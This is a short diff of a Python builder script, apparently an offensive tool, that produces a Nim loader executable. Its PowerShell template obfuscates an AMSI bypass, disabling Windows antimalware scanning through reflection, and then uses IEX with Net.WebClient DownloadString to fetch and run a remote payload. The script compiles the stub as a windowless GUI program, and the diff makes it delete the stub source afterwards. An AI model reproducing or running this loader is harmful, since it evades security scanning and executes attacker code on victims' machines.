@@ -31,7 +31,6 @@ runspace.Close()
 """
 URL = """
 Set-Variable -Name w -Value ('System.Management.Automation.A');Set-Variable -Name c -Value ('si');Set-Variable -Name m -Value ('Utils');Set-Variable -Name assembly -Value ([Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m)));Set-Variable -Name field -Value ($assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static'));$field.SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString("GREEN")
-IEX (New-Object Net.WebClient).DownloadString("GREEN")
 """
 
 def main(URL, stub, ):
@@ -53,7 +52,7 @@ def main(URL, stub, ):
     print("[+] 编译新存根...")             
     os.system("nim c -r -d:mingw --app:gui stub.nim")
     print("[+] 已经编译成功stub.exe")
-    #os.system("del stub.nim")
+    os.system("del stub.nim")
 main(URL, stub)
 
 
